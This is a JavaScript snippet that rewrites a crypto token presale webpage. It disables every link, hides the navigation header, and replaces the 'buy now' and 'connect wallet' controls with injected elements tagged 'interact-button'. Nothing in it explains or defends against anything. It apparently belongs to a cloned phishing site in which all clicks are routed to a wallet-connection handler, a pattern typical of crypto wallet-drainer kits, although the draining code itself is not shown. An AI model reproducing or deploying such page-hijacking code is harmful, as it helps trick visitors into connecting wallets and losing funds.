let buyNowbtn;
let connectArea;
let allLinks;
let nav;

function getLinks() {
  const inva = setInterval(() => {
    allLinks = document.links;
    if (allLinks.length > 0) {
      console.log(document.links);
      for (let i = 0; i < allLinks.length; i++) {
        const e = allLinks[i];
        e.setAttribute("href", "javascript:void();");
        e.setAttribute("target", "");
        e.classList.add("interact-button");
      }
      clearInterval(inva);
    }
  }, 300);
}
getLinks();
function getBtn() {
  const intv = setInterval(() => {
    nav = document.querySelector(navClasses);
    buyNowbtn = document.querySelector(buyNowBtnClasses);
    connectArea = document.querySelector(connectAreaClasses);
    console.log("loop");
    if (connectArea) {
      nav.classList.add("hiddenn");
      console.log(nav);
      if (buyNowbtn) buyNowbtn.outerHTML = buyNowbtn1;
      if (connectArea) connectArea.outerHTML = connectArea1;
      clearInterval(intv);
    }
  }, 300);
}
getBtn();

const buyNowBtnClasses =
  ".connect.d-flex.align-items-center.text-uppercase.ms-4.ng-star-inserted";
const buyNowbtn1 = `<div _ngcontent-ng-c3647855093="" class="connect interact-button bkgOrange d-flex align-items-center text-uppercase ms-4 ng-star-inserted"><div _ngcontent-ng-c3647855093="" translate="" class="mx-2">buy_now</div></div>`;
//
const connectAreaClasses =
  ".d-flex.align-items-center.justify-content-center.gap-2.flex-wrap.flex-sm-nowrap.mt-3.ng-star-inserted";
const connectArea1 = `
<div _ngcontent-ng-c861233210="" class=" interact-button d-flex align-items-center justify-content-center gap-2 flex-wrap flex-sm-nowrap mt-3 ng-star-inserted"  >
<button _ngcontent-ng-c861233210="" translate="" class="btn btn-primary fs-7 w-50 ng-star-inserted maxx-widthh">connect_Wallet</button><!----><!---->
<div _ngcontent-ng-c861233210="" dropdown="" dropdowntoggle="" class="btn btn-outline-primary fs-7 w-50 buyWith btn-group dropup" aria-haspopup="true" aria-expanded="false"><div _ngcontent-ng-c861233210="" type="button" class="dropdown-toggle d-flex align-items-center justify-content-between w-100"><img _ngcontent-ng-c861233210="" height="22" alt="" src="/assets/images/svg-icons/ETH.svg"><a _ngcontent-ng-c861233210="" class="text-black text-decoration-none selectedMenu me-2"> ETH</a><svg-icon _ngcontent-ng-c861233210="" src="./assets/images/svg-icons/down-arrow.svg" class="dropdown"></svg-icon></div><!----></div><!----></div>
`;
const navClasses =
  ".header.desktop.d-flex.justify-content-between.align-items-center.ng-star-inserted";
